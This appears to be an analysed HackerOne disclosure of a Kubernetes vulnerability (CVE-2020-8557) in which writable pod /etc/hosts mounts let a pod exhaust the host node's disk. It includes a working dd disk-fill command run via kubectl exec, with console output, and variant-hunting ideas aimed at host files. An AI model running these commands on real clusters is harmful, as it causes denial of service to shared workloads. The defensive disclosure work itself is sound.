# Node Disk DOS by Writing to Container /etc/hosts

## Metadata
- **Source:** HackerOne
- **Report:** 867699 | https://hackerone.com/reports/867699
- **Submitted:** 2020-05-07
- **Reporter:** kebe
- **Program:** Kubernetes
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Denial of Service, Privilege Escalation, Resource Exhaustion, Container Escape
- **CVEs:** CVE-2020-8557
- **Category:** memory-binary

## Summary
Pod configuration files (/etc/hosts, /etc/hostname, /etc/resolv.conf) are not mounted as read-only by default in Kubernetes <= 1.18, allowing unprivileged pods to write arbitrary data and exhaust the host node's disk space. A malicious pod can fill the host's disk by writing to these mounted files, causing a denial of service affecting all workloads on that node.

## Attack scenario
1. Attacker deploys a pod in a Kubernetes cluster using standard deployment methods (kubectl run or similar)
2. Attacker identifies that /etc/hosts, /etc/hostname, and /etc/resolv.conf are mounted from the host as writable volumes
3. Attacker executes dd command within the pod to write large amounts of zero data to /etc/hosts: `dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M`
4. The writes directly consume disk space on the host node's /var/lib/kubelet directory where container filesystems are stored
5. Host node disk space depletes rapidly, triggering out-of-disk errors across the node
6. Node becomes unavailable causing pod evictions and service disruption for legitimate workloads

## Root cause
Kubernetes mounts pod management files (/etc/hosts, /etc/hostname, /etc/resolv.conf) with writable permissions from the host filesystem directly into containers. These files are critical for node operations but were not protected with read-only mount flags, allowing any pod to modify them and exhaust disk space.

## Attacker mindset
Attacker seeks to disrupt cloud infrastructure or perform denial of service attacks. By exploiting default Kubernetes configurations, they can affect multiple workloads without requiring elevated privileges. This is particularly impactful in multi-tenant environments where one tenant can impact others through shared node resources.

## Defensive takeaways
- Mount /etc/hosts, /etc/hostname, and /etc/resolv.conf as read-only filesystems in pod specifications using readOnlyRootFilesystem or volumeMounts with readOnly: true
- Upgrade to Kubernetes >= 1.19 where these files are mounted read-only by default
- Implement resource quotas and pod resource limits to prevent unbounded disk consumption
- Monitor node disk usage and implement alerts for rapid disk space consumption
- Use Pod Security Policies to restrict container capabilities and enforce security standards
- Implement network policies and container runtime security to limit pod capabilities
- Enable kubelet eviction policies to gracefully handle low disk conditions

## Variant hunting
Test other critical host paths mounted into containers (/etc/passwd, /etc/shadow, /etc/group, /proc/sys, /sys/kernel)
Investigate if other configuration files exposed to pods can trigger similar DOS conditions
Check if symlink attacks can be leveraged to write beyond mounted paths
Examine if inode exhaustion attacks are possible on other mounted filesystems
Test whether privileged containers have even greater impact on host resources
Investigate namespace escape techniques that might allow direct host filesystem manipulation

## MITRE ATT&CK
- T1190
- T1499
- T1526
- T1578
- T1562

## Notes
This vulnerability affects the default Kubernetes configuration and requires no special permissions or capabilities. It demonstrates a fundamental design issue where critical system files were exposed as writable to untrusted workloads. The impact is severe in multi-tenant cloud environments. The fix in later Kubernetes versions (read-only mounts by default) is a critical security improvement. Organizations running Kubernetes <= 1.18 should prioritize patching or implement compensating controls immediately.

## Full report
<details><summary>Expand</summary>

Report Submission Form

## Summary:
Pod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.
A normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.
Not only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.

## Kubernetes Version:
<=1.18

## Component Version:
Docker 19.03

## Steps To Reproduce:

  1. use kubectl create a pod like kubectl run 
  2. run `kubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M`
  3. run `df -h /var/lib/kubelet` on host that pod running, you can see the disk avaliable space are decreasing until the disk full.

## Supporting Material/References:
```console
[root@kebe-sm-315 ~]# kubectl exec -it rate-c848c5c8b-5b8vm sh
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl kubectl exec [POD] -- [COMMAND] instead.
Defaulting container name to rate.
Use 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.
/ # df -h
Filesystem                Size      Used Available Use% Mounted on
/dev/mapper/docker-8:16-67108930-710dfe5c781bd17e11968371b9d0f84641a2efde95c68a47eddf9ae518e768d1
                         10.0G     40.3M     10.0G   0% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                     9.7G         0      9.7G   0% /sys/fs/cgroup
/dev/mapper/centos-root
                         53.0G     28.6G     24.4G  54% /dev/termination-log
/dev/sdb                100.0G     40.9G     59.1G  41% /etc/resolv.conf
/dev/sdb                100.0G     40.9G     59.1G  41% /etc/hostname
/dev/mapper/centos-root
                         53.0G     28.6G     24.4G  54% /etc/hosts
shm                      64.0M      8.0K     64.0M   0% /dev/shm
tmpfs                     9.7G     12.0K      9.7G   0% /var/run/secrets/kubernetes.io/serviceaccount
tmpfs                     9.7G         0      9.7G   0% /proc/acpi
tmpfs                    64.0M         0     64.0M   0% /proc/kcore
tmpfs                    64.0M         0     64.0M   0% /proc/keys
tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
tmpfs                    64.0M         0     64.0M   0% /proc/timer_stats
tmpfs                    64.0M         0     64.0M   0% /proc/sched_debug
tmpfs                     9.7G         0      9.7G   0% /proc/scsi
tmpfs                     9.7G         0      9.7G   0% /sys/firmware

[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al
总用量 12
drwxr-xr-x  5 root root   71 5月   7 12:29 .
drwxr-x--- 50 root root 4096 5月   7 12:29 ..
drwxr-x---  5 root root   55 5月   7 12:31 containers
-rw-r--r--  1 root root  270 5月   7 12:31 etc-hosts
drwxr-x---  3 root root   37 5月   7 12:29 plugins
drwxr-xr-x  4 root root   65 5月   7 12:29 volumes
[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=100 bs=1M
Defaulting container name to rate.
Use 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.
100+0 records in
100+0 records out
[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al
总用量 102408
drwxr-xr-x  5 root root        71 5月   7 12:29 .
drwxr-x--- 50 root root      4096 5月   7 12:29 ..
drwxr-x---  5 root root        55 5月   7 12:31 containers
-rw-r--r--  1 root root 104857600 5月   7 15:06 etc-hosts
drwxr-x---  3 root root        37 5月   7 12:29 plugins
drwxr-xr-x  4 root root        65 5月   7 12:29 volumes
```

  * [attachment / reference]

## Impact

If someone create a pod on a public cloud with kubernetes, the host of the provider may panic due to disk full.

</details>

---
*Analysed by Claude on 2026-05-24*
